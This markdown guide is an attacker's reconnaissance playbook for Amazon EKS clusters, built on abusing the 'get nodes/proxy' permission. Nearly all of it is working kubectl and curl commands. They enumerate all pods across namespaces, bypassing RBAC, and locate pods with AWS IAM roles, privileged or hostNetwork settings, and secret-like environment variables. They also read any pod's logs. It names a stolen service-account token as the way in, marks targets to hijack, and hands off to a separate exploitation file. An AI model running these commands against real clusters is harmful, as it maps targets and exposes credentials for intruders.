# EKS nodes/proxy — Manual Recon Commands

> Run these BEFORE the exploit to understand what you have access to.
> All you need: `kubectl` or `curl` + a readonly bearer token with `get nodes/proxy`.

---

## 0. Setup Variables

```bash
# Your EKS cluster API server (from kubeconfig or aws eks describe-cluster)
export EKS_SERVER="https://ABCDE12345.gr7.us-east-1.eks.amazonaws.com"

# Your bearer token (from kubeconfig, stolen SA token, OIDC, etc.)
export TOKEN="eyJhbGciOiJSUzI1NiIs..."

# If you have a kubeconfig file:
export KUBECONFIG=/path/to/kubeconfig.yaml
```

---

## 1. Who Am I?

```bash
# Method 1: kubectl
kubectl auth whoami

# Method 2: API call (works without kubectl)
curl -sk -H "Authorization: Bearer $TOKEN" "$EKS_SERVER/apis/authentication.k8s.io/v1/selfsubjectreviews" \
  -X POST -H "Content-Type: application/json" \
  -d '{"apiVersion":"authentication.k8s.io/v1","kind":"SelfSubjectReview","metadata":{"creationTimestamp":null},"status":{"userInfo":{}}}'
```

---

## 2. What Can I Do? (RBAC Check)

```bash
# Check specifically for nodes/proxy (this is all you need)
kubectl auth can-i get nodes/proxy
# Expected: "yes"

# Check what you CAN'T do (these should all say "no")
kubectl auth can-i list pods
kubectl auth can-i get secrets
kubectl auth can-i create pods
kubectl auth can-i get pods --subresource=exec

# Full permissions dump
kubectl auth can-i --list 2>/dev/null | head -30

# API call version (no kubectl)
curl -sk -H "Authorization: Bearer $TOKEN" "$EKS_SERVER/apis/authorization.k8s.io/v1/selfsubjectaccessreviews" \
  -X POST -H "Content-Type: application/json" \
  -d '{"apiVersion":"authorization.k8s.io/v1","kind":"SelfSubjectAccessReview","spec":{"resourceAttributes":{"verb":"get","resource":"nodes","subresource":"proxy"}}}'
```

---

## 3. List All Nodes

```bash
# kubectl
kubectl get nodes -o wide

# API call (shows all node details)
curl -sk -H "Authorization: Bearer $TOKEN" "$EKS_SERVER/api/v1/nodes" | jq '.items[] | {
  name: .metadata.name,
  ip: (.status.addresses[] | select(.type=="InternalIP") | .address),
  instance: (.metadata.labels["node.kubernetes.io/instance-type"] // "unknown"),
  zone: (.metadata.labels["topology.kubernetes.io/zone"] // "unknown"),
  os: .status.nodeInfo.osImage,
  kubelet: .status.nodeInfo.kubeletVersion
}'

# Just node names + IPs (quick)
curl -sk -H "Authorization: Bearer $TOKEN" "$EKS_SERVER/api/v1/nodes" | \
  jq -r '.items[] | .metadata.name + " " + (.status.addresses[] | select(.type=="InternalIP") | .address)'
```

**EKS node names look like:** `ip-10-0-1-42.us-east-1.compute.internal`

---

## 4. Enumerate ALL Pods on a Node (THE KEY STEP)

```bash
# This is the vulnerability — "get nodes/proxy" lets you list ALL pods
# regardless of namespace RBAC

NODE="ip-10-0-1-42.us-east-1.compute.internal"

# Via kubectl (returns kubelet pod list)
kubectl get --raw "/api/v1/nodes/$NODE/proxy/pods"

# Pretty print with jq
kubectl get --raw "/api/v1/nodes/$NODE/proxy/pods" | jq '.items[] | {
  namespace: .metadata.namespace,
  name: .metadata.name,
  containers: [.spec.containers[].name],
  hostNetwork: (.spec.hostNetwork // false),
  serviceAccount: .spec.serviceAccountName,
  annotations: (.metadata.annotations // {})
}'

# API call version (no kubectl)
curl -sk -H "Authorization: Bearer $TOKEN" "$EKS_SERVER/api/v1/nodes/$NODE/proxy/pods" | jq .

# Quick list: namespace/pod-name
curl -sk -H "Authorization: Bearer $TOKEN" "$EKS_SERVER/api/v1/nodes/$NODE/proxy/pods" | \
  jq -r '.items[] | .metadata.namespace + "/" + .metadata.name'
```

---

## 5. Find High-Value Targets

### 5a. Pods with IRSA (AWS IAM Roles)

```bash
# IRSA pods have eks.amazonaws.com/role-arn annotation
curl -sk -H "Authorization: Bearer $TOKEN" "$EKS_SERVER/api/v1/nodes/$NODE/proxy/pods" | \
  jq -r '.items[] | select(.metadata.annotations["eks.amazonaws.com/role-arn"] != null) |
  .metadata.namespace + "/" + .metadata.name + " → " + .metadata.annotations["eks.amazonaws.com/role-arn"]'
```

### 5b. Privileged Pods

```bash
curl -sk -H "Authorization: Bearer $TOKEN" "$EKS_SERVER/api/v1/nodes/$NODE/proxy/pods" | \
  jq -r '.items[] | select(.spec.containers[].securityContext.privileged == true) |
  .metadata.namespace + "/" + .metadata.name + " [PRIVILEGED]"'
```

### 5c. HostNetwork Pods (can reach IMDS)

```bash
curl -sk -H "Authorization: Bearer $TOKEN" "$EKS_SERVER/api/v1/nodes/$NODE/proxy/pods" | \
  jq -r '.items[] | select(.spec.hostNetwork == true) |
  .metadata.namespace + "/" + .metadata.name + " [hostNetwork]"'
```

### 5d. Pods with Secret-Looking Env Vars

```bash
curl -sk -H "Authorization: Bearer $TOKEN" "$EKS_SERVER/api/v1/nodes/$NODE/proxy/pods" | \
  jq -r '.items[] | . as $pod | .spec.containers[] | . as $c |
  $c.env[]? | select(.name | test("SECRET|PASS|KEY|TOKEN|CRED"; "i")) |
  $pod.metadata.namespace + "/" + $pod.metadata.name + " [" + $c.name + "] " + .name'
```

### 5e. All kube-system Pods (system components)

```bash
curl -sk -H "Authorization: Bearer $TOKEN" "$EKS_SERVER/api/v1/nodes/$NODE/proxy/pods" | \
  jq -r '.items[] | select(.metadata.namespace == "kube-system") |
  .metadata.name + " [" + (.spec.containers[0].name) + "]"'
```

---

## 6. Check Kubelet Connectivity

```bash
# Get node internal IP
NODE_IP=$(curl -sk -H "Authorization: Bearer $TOKEN" "$EKS_SERVER/api/v1/nodes/$NODE" | \
  jq -r '.status.addresses[] | select(.type=="InternalIP") | .address')

echo "Node IP: $NODE_IP"

# Test direct kubelet (from inside a pod in the VPC)
curl -sk --http1.1 -H "Authorization: Bearer $TOKEN" "https://$NODE_IP:10250/pods" | jq '.items | length'
```

---

## 7. Node Metadata via Proxy (Bonus Recon)

```bash
# kubelet stats
kubectl get --raw "/api/v1/nodes/$NODE/proxy/stats/summary" | jq '.node | {nodeName, cpu: .cpu.usageNanoCores, memory: .memory.workingSetBytes}'

# kubelet healthz
kubectl get --raw "/api/v1/nodes/$NODE/proxy/healthz"

# kubelet configz (may reveal kubelet configuration)
kubectl get --raw "/api/v1/nodes/$NODE/proxy/configz" 2>/dev/null | jq .

# Container logs (read any pod's logs!)
kubectl get --raw "/api/v1/nodes/$NODE/proxy/containerLogs/NAMESPACE/POD/CONTAINER"
```

---

## 8. Cross-Node Recon (All Nodes)

```bash
# Loop through all nodes and enumerate
for NODE in $(curl -sk -H "Authorization: Bearer $TOKEN" "$EKS_SERVER/api/v1/nodes" | jq -r '.items[].metadata.name'); do
  echo "=== $NODE ==="
  curl -sk -H "Authorization: Bearer $TOKEN" "$EKS_SERVER/api/v1/nodes/$NODE/proxy/pods" | \
    jq -r '.items[] | "  " + .metadata.namespace + "/" + .metadata.name'
  echo ""
done
```

---

## Summary: What Information Recon Gives You

| Recon Step | What You Learn |
|---|---|
| Who Am I | Your user/SA identity and auth method |
| RBAC Check | Confirm you ONLY have `get nodes/proxy` |
| List Nodes | All node names, IPs, instance types, zones |
| Enumerate Pods | **ALL pods across ALL namespaces** on each node |
| IRSA Pods | Which pods have AWS IAM roles (jackpot for AWS access) |
| Privileged Pods | Container escape targets |
| HostNetwork Pods | IMDS access targets |
| Secret Env Vars | Pods with hardcoded secrets |
| kube-system Pods | System components to hijack |

**After recon → proceed to [02-EXPLOIT-COMMANDS.md](02-EXPLOIT-COMMANDS.md) for exploitation.**
